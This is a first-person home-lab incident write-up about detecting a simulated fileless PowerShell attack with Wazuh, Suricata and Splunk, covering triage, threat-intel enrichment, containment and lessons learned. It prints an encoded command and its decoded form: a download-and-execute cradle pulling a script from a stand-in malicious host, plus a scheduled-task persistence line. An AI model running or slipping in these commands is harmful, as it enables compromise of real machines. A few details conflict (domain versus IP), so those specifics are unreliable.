00. Lab Environment

Before getting into the incident itself, some context on the setup. This all runs on about $80 of hardware. A Raspberry Pi Zero 2 W handles Suricata IDS, monitoring traffic on the home network and generating EVE JSON logs that get forwarded over TCP to a Splunk instance on my Windows PC. Wazuh HIDS watches WIN-LAB-01, and a Pi-hole handles DNS sinkholing with its query logs also feeding Splunk. By the time this incident happened, I'd been running and tuning the stack for several months — alert volume had come down from roughly 120 per day to something manageable.

This investigation was a controlled exercise using Atomic Red Team — a library of adversary simulation tests mapped to MITRE ATT&CK. I ran it against WIN-LAB-01 to validate whether the detection pipeline would catch a fileless PowerShell attack in practice, not just in theory. Throughout the investigation I treated it exactly as I would a real incident: same triage process, same correlation queries, same documentation. The goal wasn't to pass a test. It was to find out where the gaps were.

01. Executive Summary

I want to be honest about how this started: when Wazuh Rule 91816 first came in, my gut said false positive. I'd seen a dozen PowerShell-related alerts in the previous two weeks — Windows Update scripts, a PowerShell module I installed, legitimate admin tasks that happened to look suspicious. Rule 91816 flags encoded command execution, which is noisy in a home environment where plenty of legitimate tools use Base64 for encoding reasons unrelated to evasion.

What stopped me from moving on was the severity level. Level 12 in Wazuh's scale means the rule has high confidence this is malicious — it's not a catch-all, its specifically tuned to flag encoded commands that match known attack patterns. I opened the raw log, saw the -EncodedCommand flag, and decided to decode it before doing anything else.

The decode took about 5 minutes — including one failed attempt where I had the wrong encoding selected in CyberChef. When it came out clean, I was looking at two distinct malicious actions in a single command: an IEX download chain pulling a remote payload from an attacker-controlled server, and a schtasks persistence mechanism that would survive reboots. At that point, the investigation was active.

02. Initial Detection

The alert surfaced in Splunk at 14:23:17 EST. I wasn't staring at the dashboard — I check in every 20 minutes or so between other tasks. The Wazuh alert had already propagated by the time I saw it. Here's the raw alert data that stopped everything else:

WAZUH ALERT — RULE 91816 · WIN-LAB-01
SeverityHigh — Level 12
HostWIN-LAB-01 (192.168.1.150)
Userlabuser
Timestamp2024-12-10 14:23:17 EST
Rule Desc.PowerShell encoded command detected — potential obfuscated execution
Data SourceSysmon Event ID 1 (process creation) → Wazuh → Splunk

Raw command captured by Sysmon Event ID 1:

powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMAWwAuAF0AYwBvAG0ALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=

Decoded (UTF-16LE — my first attempt with UTF-8 failed and gave garbage output):

IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]com/stage2.ps1')
schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update.ps1" /sc onlogon
Why this matters: Two malicious actions bundled into one encoded command. The first — IEX + WebClient.DownloadString — is a classic fileless technique: the payload downloads and executes entirely in memory, never writing to disk in a traditional sense, which bypasses a lot of AV signatures that look for file writes. The second — schtasks /sc onlogon — means persistence that survives reboots. The Base64 encoding itself is specifically intended to evade string-matching rules that look for those keywords in plain text. A defender who only looks at process names without decoding the payload would miss the entire attack.
03. Investigation Timeline

What follows is a step-by-step account of how the investigation actually unfolded — including where I got slowed down, what I had to rethink, and what each data source added to the picture.

T+0:00 — Alert received, initial triage
Decode First, Escalate Second

Standard triage habit: before escalating or correlating anything, I decode the payload. If the decode comes back clean, I can close the alert fast. If it doesn't, I know what I'm dealing with before I run any queries.

The -EncodedCommand flag is a dead giveaway that something is encoded — it's a built-in PowerShell parameter for running Base64-encoded commands, and attackers use it specifically because the command content doesn't appear in clear text in process logs (unless Sysmon is capturing full command lines, which mine was). I copied the payload into CyberChef, tried UTF-8 decode first, got garbage. Switched to UTF-16LE, which is PowerShell's native encoding, and got the plain text on the second try.

Seeing the IEX download chain and schtasks in the output together, I escalated to High, created a mental incident record, and moved to correlation.

T+0:05 — Log correlation, multi-source
Three Query Iterations for a Clean View

I won't pretend the Splunk query came together on the first try. My initial query was too broad — I got thousands of events spanning the whole day. Narrowed by host, then by a 5-minute time window around the alert timestamp, then filtered out known-clean event types. Third iteration gave me a useful timeline view.

index=suricata OR index=wazuh OR index=windows host="WIN-LAB-01"
earliest=-2m@m latest=+5m@m
| eval _time=strptime(timestamp, "%Y-%m-%dT%H:%M:%S")
| sort _time
| table _time, source, src_ip, dest_ip, dest_port, alert.signature, full_log

The correlation is what changed this from "suspicious" to "confirmed malicious." Any one source alone could theoretically be explained away:

  • Wazuh alone: could be a legitimate admin script that someone encoded for unrelated reasons
  • Suricata alone: a single HTTP request to an external IP is not unusual on a home network
  • Event ID 4698 alone: scheduled tasks get created by legitimate software constantly

But all three firing within a 2-second window, pointing to the same host, with the network traffic destination matching the IP in the decoded payload — that's not a coincidence. The correlation closed the case on whether this was real.

T+0:12 — Threat intelligence enrichment
AbuseIPDB Doesn't Lie at 100/100

I ran the C2 IP 185.220.101.42 through my threat intel automation bot (CyberOps Sidekick — a Python bot I built that queries AbuseIPDB, VirusTotal, and AlienVault OTX in parallel and returns a consolidated enrichment report). Takes about 30 seconds.

  • AbuseIPDB: 100/100 confidence score, 47 reports filed against this IP in the last 90 days
  • VirusTotal: 8 out of 92 engines flagged it malicious — not overwhelming, but meaningful alongside the AbuseIPDB score
  • AlienVault OTX: associated with commodity malware campaigns, not targeted attacks
  • Domain age: registered 3 days before the incident

The domain age was the detail that stuck with me most. Infrastructure that fresh is definitley not a legitimate service — nobody builds a real product on a 3-day-old domain. Its either a throwaway domain for a single campaign, or fresh infrastructure being stood up for an active operation. Either way, not something to dismiss.

The commodity malware attribution from OTX was actually somewhat reassuring — it suggested this was spray-and-pray, not someone targeting me specifically. That shifted the response priority slightly, but didn't change the containment actions.

T+0:25 — Host forensics
Slowing Down Before the Kill Switch

This is the phase where I deliberately slowed down. I had enough to confirm this was malicious — but I wanted the full host-side picture before I started making changes to the system. Containment destroys some forensic evidence if you're not careful. My goal was to collect what I needed first.

Sysmon was invaluable here. Without it, Windows event logs give you process creation (Event ID 4688) but often without the full command line — depending on audit policy settings, you might just see powershell.exe with no arguments. Sysmon Event ID 1 captured the complete command including the encoded payload, which meant I had a cryptographic record of exactly what executed.

  • Event 4688: powershell.exe process creation — parent process was cmd.exe, which itself was parent'd to explorer.exe. Chain looked like a user-initiated execution.
  • Sysmon Event 1: Full command line with encoded payload captured. Process GUID matched across multiple correlated events.
  • Event 4698: "SystemUpdate" scheduled task created at 14:23:19 — exactly 2 seconds after the PowerShell execution. Real-time persistence establishment.
  • File write detected: C:\Users\Public\update.ps1 — stage-2 payload dropped to disk.

The Public directory drop was interesting. Attackers use it specifically because its writable without elevation and its less likely to have targeted monitoring compared to System32 or Temp. The fact that it landed there told me whoever built this payload had at least some operational awareness — that's not an accident or a default behavior, it's a deliberate staging choice.

T+0:42 — Containment and remediation
Contained — With an Ordering Regret

Containment was methodical but I made one sequencing mistake I want to document clearly: I isolated the host from the network via firewall egress rules before I'd finished all my forensic collection. My reasoning at the time was that the scheduled task could trigger again if the lab user logged in, re-executing the malicious PowerShell and potentially establishing the C2 connection I'd blocked.

In retrospect, the smarter move would have been to block only the specific C2 destination IP while keeping the host running, collect the remaining artifacts, then do full isolation. The malicious process was already terminated, the immediate threat was the persistence mechanism — not live C2 communication. Disabling egress to that one IP would have given me more time without losing evidence.

Nothing critical was lost — I had most of what I needed. But the ordering was a judgment call I'd make differently next time.

  • Firewall egress block applied to WIN-LAB-01 (DNS exception retained for basic function)
  • powershell.exe (PID 4892) terminated via Task Manager and confirmed dead via process list
  • C:\Users\Public\update.ps1 deleted and deletion confirmed
  • "SystemUpdate" scheduled task removed and verified absent from schtasks /query output
  • Forensic artifacts collected: memory dump (ProcDump), relevant event log exports (.evtx), registry run key hive, Sysmon log
  • Incident formally closed — timeline, IOCs, and remediation steps documented

05. MITRE ATT&CK Mapping

This attack followed a recognizable pattern — one that shows up constantly in commodity malware because it works. Four techniques in sequence: execute via PowerShell, hide the command with encoding, pull down the next stage over the network, then dig in with persistence. Understanding each step in MITRE terms is useful because it tells you exactly where in the kill chain detection was possible and where it wasn't.

T1059.001
PowerShell
Tactic: Execution
Attacker used PowerShell with IEX + WebClient to execute a remote payload entirely in memory. The fileless approach means nothing is written to disk during initial execution — traditional file-based AV misses it. Detection required process event logging (Sysmon) at the host level.
T1027
Obfuscated Files / Info
Tactic: Defense Evasion
Base64 encoding hid the malicious content from string-based detection. Any rule looking for IEX, DownloadString, or schtasks in plain text would have fired only after decoding. Wazuh Rule 91816 detects the pattern of encoded command execution rather than the decoded content — which is why it still fired.
T1053.005
Scheduled Task
Tactic: Persistence
"SystemUpdate" task created with /sc onlogon — meaning it runs every time any user logs in. A named task like "SystemUpdate" blends into the list of legitimate Windows tasks, making it easy to miss if you're just scanning the task list without knowing what to look for. Windows Event ID 4698 is the detection point.
T1105
Ingress Tool Transfer
Tactic: Command & Control
HTTP GET to 185.220.101.42 to pull stage2.ps1 from attacker infrastructure. Suricata caught this at the network layer before the payload could be executed. This is the one part of the attack where network-based detection had an advantage over host-based — the outbound connection is visible at the wire, not just on the endpoint.
06. Lessons Learned — What Actually Happened

I want to be specific here rather than give a cleaned-up list of takeaways. A "lessons learned" section that only says what worked is useless. Here's the honest version.

WHAT WORKED
  • Wazuh Rule 91816 fired immediately. I'd tuned this rule specifically while studying for CySA+ — reading about PowerShell obfuscation techniques and then going back to add detection for encoded command patterns. Seeing it fire on something real was the first time the loop between studying and doing closed for me.
  • Three-source correlation built the full picture. Wazuh had the host behavior. Suricata had the network callback. Windows event logs had the persistence mechanism. No single source told the complete story — that's not a weakness, that's how layered defense is supposed to work.
  • Threat intel enrichment was fast. CyberOps Sidekick returned the AbuseIPDB + VirusTotal + OTX consolidated report in about 30 seconds. That's 10+ minutes of manual lookups automated. In a real SOC with dozens of alerts per shift, that delta matters enormously.
  • Sysmon captured everything I needed at the host level. Without Sysmon's full command line logging, Event ID 4688 alone would have shown powershell.exe launched but not the encoded payload. The difference between those two pieces of information is the difference between a suspicious event and a confirmed malicious one.
GAPS — THE HONEST ONES
  • The Base64 decode took 5 minutes and required a manual tool switch. UTF-8 failed, I had to realize the encoding was UTF-16LE and redo it. That's not a catastrophic failure but it's 5 minutes of cognitive load on a step that should be one click. I've since added a Splunk search-time command that auto-decodes encoded PowerShell commands and appends the plaintext to the alert.
  • No written incident response playbook existed. I worked from memory — I knew what to do, but the process wasn't documented. If I'd been on-call for someone else's environment, or if this had happened at 3am when I was half-asleep, the lack of a written procedure would have cost time. I wrote the playbook the following day. It's two pages.
  • The forensic collection ordering was wrong. I isolated before finishing artifact collection because I was worried about re-infection via the scheduled task. The right call was to block only the C2 IP while collecting remaining artifacts, then do full isolation. Nothing was lost this time, but the procedure was incorrect.
  • 15-minute window between network isolation and task removal. In that 15 minutes, a reboot would have re-triggered the scheduled task and re-run the malicious script — which would have failed to reach C2 (since I'd blocked egress) but would still have attempted to execute. In a production environment that's an acceptable-but-uncomfortable window. SOAR-assisted containment would close this to under a minute.
IMPROVEMENTS IMPLEMENTED AFTER
  • Splunk alert search now auto-decodes Base64 PowerShell commands via eval decoded=base64decode(...) and appends plaintext to the alert notification
  • Custom Suricata rule written to flag -EncodedCommand patterns at the network layer as an additional detection signal
  • Written IR playbook for encoded PowerShell class of alerts — two pages, covers triage, correlation, enrichment, containment, forensics, and documentation in order
  • Forensic collection checklist added to playbook with explicit ordering: collect first, isolate second
  • Threat intel enrichment wired directly into Splunk alert workflow via webhook so enrichment starts the moment the alert fires, not when I manually run the bot
07. Conclusion

I've been asked a few times whether a home lab actually teaches you anything that transfers to a real SOC environment, or whether it's just a way to fill a resume line. This incident is my answer to that question.

The analysis I ran here — decoding an obfuscated payload, correlating three independent data sources to build an attack chain, enriching IOCs against external threat intelligence, working through host forensics before containment — that's the actual job. Not a simplified version of it, not a tutorial with training wheels. The 42-minute timeline is real. The gaps I found are real. The improvements I implemented afterward are running right now.

What a home lab doesn't give you is scale. I'm handling around 10,000 events per day; an enterprise SOC might be handling tens of millions. But the analytical process is identical — alert fires, you triage, you correlate, you enrich, you contain. The tooling helps with volume. The thinking doesn't change.

"Context is everything in this work. The initial alert was one line in Splunk. What turned it into a complete attack chain was the correlation — three sources saying three different things, all pointing at the same 2-second window on the same host."

And the thing is, every analyst starts somewhere. This lab is my somewhere. The mistakes I made here — the forensic ordering error, the missing playbook, the manual decode — I'd rather find those gaps now, in a controlled environment where the consequences are a lesson, not a breach.
